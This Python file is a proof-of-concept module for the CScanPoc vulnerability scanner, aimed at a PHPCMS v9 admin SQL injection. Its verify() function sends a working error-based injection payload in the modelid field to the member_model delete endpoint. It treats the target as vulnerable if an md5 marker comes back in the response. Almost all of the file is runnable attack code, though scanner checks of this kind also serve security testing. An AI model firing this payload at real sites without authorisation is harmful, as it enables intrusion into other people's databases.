# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0028' # 平台漏洞编号，留空
    name = 'PHPCMS 后台 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-07-25'  # 漏洞公布时间
    desc = '''
        PHPCMS /phpcmsv9/index.php?m=member&c=member_model&a=delete&pc_hash=GlyB7G SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/638/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'PHPCMSV9'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5f87af17-2723-4ca5-98e6-766132d225f6'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/phpcmsv9/index.php?m=member&c=member_model&a=delete&pc_hash=GlyB7G'
            data = 'modelid=(select * from (select * from(select name_const(md5(c),0))a join (select name_const(@@version,0))b)c)'
            url = self.target + payload
            r = requests.post(url, data=data)
            
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()